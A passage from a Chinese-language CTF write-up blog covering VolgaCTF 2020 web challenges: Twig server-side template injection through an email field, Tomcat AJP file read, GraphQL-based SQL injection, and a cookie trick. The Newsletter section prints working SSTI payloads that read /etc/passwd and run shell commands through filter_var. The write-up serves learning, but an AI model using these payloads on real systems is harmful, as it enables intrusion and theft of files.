$&#123;name&#125;.&lt;/p&gt;&lt;p&gt;Thank you for subscribing to our newsletter.&lt;/p&gt;&lt;p&gt;Regards, VolgaCTF Team&lt;/p&gt;&quot;</span></span><br><span class="line">        )-&gt;render();<span class="comment">###这里</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$mail</span> = (<span class="keyword">new</span> Email())-&gt;from(<span class="string">&#x27;newsletter@newsletter.q.2020.volgactf.ru&#x27;</span>)-&gt;to(<span class="variable">$email</span>)-&gt;subject(<span class="string">&#x27;VolgaCTF Newsletter&#x27;</span>)-&gt;html(<span class="variable">$content</span>);</span><br><span class="line">        <span class="variable">$mailer</span>-&gt;send(<span class="variable">$mail</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;Success&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;Invalid email&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">&#x27;main.twig&#x27;</span>, [<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="variable">$msg</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Response(<span class="string">&#x27;&lt;pre&gt;&#x27;</span>.htmlspecialchars(file_get_contents(<span class="keyword">__FILE__</span>)).<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们很容易知道这里存在ssti,但是有两个问题:</p>
<ol>
<li>FILTER_VALIDATE_EMAIL验证</li>
<li>如何接收结果</li>
</ol>
<p>第二个问题不难解决,直接用自己的vps接受就可以,第一个问题通过查询维基百科也可以构造出payload,但是payload却有长度限制,最多只能有64个字符,通常的twig ssti的payload是无法直接用的了,需要我们自己挖掘</p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly">https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly</a><br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Email_address">https://en.wikipedia.org/wiki/Email_address</a></p>
<p><code>python -m smtpd -n -c DebuggingServer 0.0.0.0:25</code></p>
<p>以下是我挖掘发现的payload,最后还是没能做出来,原因是自己查询的版本和题目的版本不一样</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">&quot;&#123;&#123;app.request&#125;&#125;&quot;</span>@ccreater.top</span><br><span class="line"><span class="string">&quot;&#123;&#123;app.environment&#125;&#125;&quot;</span>%<span class="number">40</span>ccreater.top  : prod</span><br><span class="line"><span class="string">&quot;&#123;&#123;app.request.request.get(&#x27;name&#x27;)&#125;&#125;&quot;</span>@[<span class="number">47.107</span>.<span class="number">171.219</span>]</span><br><span class="line">email=<span class="string">&quot;&#123;&#123;render(controller(app.request.request.get(&#x27;a&#x27;)))&#125;&#125;&quot;</span>@ccreater.top&amp;a=App\Controller\MainController::source</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&#123;&#123;render(controller(app.request.query.get(1),&#123;&#x27;file&#x27;:&#x27;flag&#x27;&#125;))&#125;&#125;&quot;</span>@ccreater.top <span class="number">1</span>=Symfony\Bundle\FrameworkBundle\Controller::file</span><br><span class="line">文件名最长只能<span class="number">4</span>个,并没有读到flag</span><br></pre></td></tr></table></figure>


<p>以下是wp提供的payload</p>
<p><a target="_blank" rel="noopener" href="https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt">https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">email=&quot;&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;&quot;@attacker.tld</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /subscribe?0=cat+/etc/passwd HTTP/1.1</span><br><span class="line">Host: newsletter.q.2020.volgactf.ru</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">email=&quot;&#123;&#123;app.request.query.filter(0,0,1024,&#123;&#x27;options&#x27;:&#x27;system&#x27;&#125;)&#125;&#125;&quot;@attacker.tld</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/3.x/functions/constant.html">https://twig.symfony.com/doc/3.x/functions/constant.html</a><br>VolgaCTF_6751602deea2a308ab611eeef7a4e961<br><a target="_blank" rel="noopener" href="https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html?m=1">https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html?m=1</a></p>
<p>其中有一个filter_var来命令执行实在是让我惊讶</p>
<h3 id="NetCorp"><a href="#NetCorp" class="headerlink" title="NetCorp"></a>NetCorp</h3><p>这题挺简单的,但是我还是搞了好久,对jsp和题目的cve一点都不熟悉,搞得我写个payload都百度半天</p>
<p>端口扫描发现:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8009/tcp open     ajp13</span><br><span class="line">9090/tcp open     zeus-admin</span><br></pre></td></tr></table></figure>

<p>tomcat ajp前段时间刚好出了个文件读取/包含的漏洞</p>
<p>试了一下,确实存在这个洞</p>
<p>先读取/WEB-INF/web.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>NetCorp<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServeScreenshot<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ServeScreenshot<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>ru.volgactf.netcorp.ServeScreenshotServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServeScreenshot<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ServeScreenshot<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServeComplaint<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ServeComplaint<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">description</span>&gt;</span>Complaint info<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>ru.volgactf.netcorp.ServeComplaintServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServeComplaint<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ServeComplaint<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">location</span>&gt;</span>/404.html<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>再读取其他的class文件,其中发现一个上传点</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> ru.volgactf.netcorp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServeScreenshotServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ServeScreenshotServlet</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ServeScreenshotServlet Constructor called!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig config)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ServeScreenshotServlet \&quot;Init\&quot; method called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ServeScreenshotServlet \&quot;Destroy\&quot; method called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String appPath = request.getServletContext().getRealPath(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        String savePath = (<span class="keyword">new</span> StringBuilder()).append(appPath).append(<span class="string">&quot;uploads&quot;</span>).toString();</span><br><span class="line">        File fileSaveDir = <span class="keyword">new</span> File(savePath);</span><br><span class="line">        <span class="keyword">if</span>(!fileSaveDir.exists())</span><br><span class="line">            fileSaveDir.mkdir();</span><br><span class="line">        String submut = request.getParameter(<span class="string">&quot;submit&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(submut != <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">if</span>(submut.equals(<span class="string">&quot;true&quot;</span>));</span><br><span class="line">        PrintWriter out = request.getParts().iterator();</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!out.hasNext())</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            Part part = (Part)out.next();</span><br><span class="line">            String fileName = extractFileName(part);</span><br><span class="line">            fileName = (<span class="keyword">new</span> File(fileName)).getName();</span><br><span class="line">            String hashedFileName = generateFileName(fileName);</span><br><span class="line">            String path = (<span class="keyword">new</span> StringBuilder()).append(savePath).append(File.separator).append(hashedFileName).toString();</span><br><span class="line">            <span class="keyword">if</span>(!path.equals(<span class="string">&quot;Error&quot;</span>))</span><br><span class="line">                part.write(path);</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="keyword">true</span>);</span><br><span class="line">        out = response.getWriter();</span><br><span class="line">        response.setContentType(<span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        out.print(String.format(<span class="string">&quot;&#123;&#x27;success&#x27;:&#x27;%s&#x27;&#125;&quot;</span>, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">            <span class="string">&quot;true&quot;</span></span><br><span class="line">        &#125;));</span><br><span class="line">        out.flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">generateFileName</span><span class="params">(String fileName)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String s2;</span><br><span class="line">        StringBuilder sb;</span><br><span class="line">        MessageDigest md = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        md.update(fileName.getBytes());</span><br><span class="line">        <span class="keyword">byte</span> digest[] = md.digest();</span><br><span class="line">        s2 = (<span class="keyword">new</span> BigInteger(<span class="number">1</span>, digest)).toString(<span class="number">16</span>);</span><br><span class="line">        sb = <span class="keyword">new</span> StringBuilder(<span class="number">32</span>);</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> count = <span class="number">32</span> - s2.length(); i &lt; count; i++)</span><br><span class="line">            sb.append(<span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.append(s2).toString();</span><br><span class="line">        NoSuchAlgorithmException e;</span><br><span class="line">        e;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">extractFileName</span><span class="params">(Part part)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String contentDisp = part.getHeader(<span class="string">&quot;content-disposition&quot;</span>);</span><br><span class="line">        String items[] = contentDisp.split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">        String as[] = items;</span><br><span class="line">        <span class="keyword">int</span> i = as.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            String s = as[j];</span><br><span class="line">            <span class="keyword">if</span>(s.trim().startsWith(<span class="string">&quot;filename&quot;</span>))</span><br><span class="line">                <span class="keyword">return</span> s.substring(s.indexOf(<span class="string">&quot;=&quot;</span>) + <span class="number">2</span>, s.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SAVE_DIR = <span class="string">&quot;uploads&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>于是问题解决了</p>
<h3 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h3><p>这题有点意思,让我接触了一个新的查询语言 Graphql </p>
<p>先是通过报错获知了后端是nodejs,又通过报错得知了api是Graphql </p>
<p>[PayloadsAllTheThings GraphQL]( <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL</a> Injection )</p>
<p>看了他们的官方文档,英文看的头都痛了,才了解一些(平常翘英语课的后果//)</p>
<p>根据他们的例子找到了一个奇怪的query name</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;name&quot;</span>: <span class="string">&quot;testGetUsersByFilter&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;args&quot;</span>: [</span><br><span class="line">                          &#123;</span><br><span class="line">                              <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;filter&quot;</span>,</span><br><span class="line">                              <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                              <span class="attr">&quot;type&quot;</span>: &#123;</span><br><span class="line">                                  <span class="attr">&quot;kind&quot;</span>: <span class="string">&quot;INPUT_OBJECT&quot;</span>,</span><br><span class="line">                                  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;UserFilter&quot;</span>,</span><br><span class="line">                                  <span class="attr">&quot;ofType&quot;</span>: <span class="literal">null</span></span><br><span class="line">                              &#125;,</span><br><span class="line">                              <span class="attr">&quot;defaultValue&quot;</span>: <span class="literal">null</span></span><br><span class="line">                          &#125;</span><br><span class="line">                      ],</span><br><span class="line">                      <span class="string">&quot;type&quot;</span>: &#123;</span><br><span class="line">                          <span class="attr">&quot;kind&quot;</span>: <span class="string">&quot;LIST&quot;</span>,</span><br><span class="line">                          <span class="attr">&quot;name&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">                          <span class="attr">&quot;ofType&quot;</span>: &#123;</span><br><span class="line">                              <span class="attr">&quot;kind&quot;</span>: <span class="string">&quot;OBJECT&quot;</span>,</span><br><span class="line">                              <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;User&quot;</span>,</span><br><span class="line">                              <span class="attr">&quot;ofType&quot;</span>: <span class="literal">null</span></span><br><span class="line">                          &#125;</span><br><span class="line">                      &#125;,</span><br><span class="line">                      <span class="string">&quot;isDeprecated&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&quot;deprecationReason&quot;</span>: <span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>妥妥的薄弱点<br>构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">query testGetUsersByFilter($input: UserFilter)&#123;</span><br><span class="line">    testGetUsersByFilter(filter:$input) &#123;</span><br><span class="line">        name</span><br><span class="line">        login</span><br><span class="line">        email</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#123;&quot;input&quot;:&#123;&quot;login&quot;:&quot;\\&quot;,&quot;name&quot;:&quot; a&quot;,&quot;email&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>返回提示数据库错误,sql注入get</p>
<h3 id="User-Center"><a href="#User-Center" class="headerlink" title="User Center"></a>User Center</h3><p> <a target="_blank" rel="noopener" href="https://spotless.tech/volgactf-2020-qualifier-user-center.html">https://spotless.tech/volgactf-2020-qualifier-user-center.html</a> </p>
<p>总结:不同浏览器解析http报文的方式不同</p>
<p>子域可以修改域的cookie</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/volgactf/" data-id="cku8j3fic006kdan7cgsp62oa" data-title="volgactf" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li 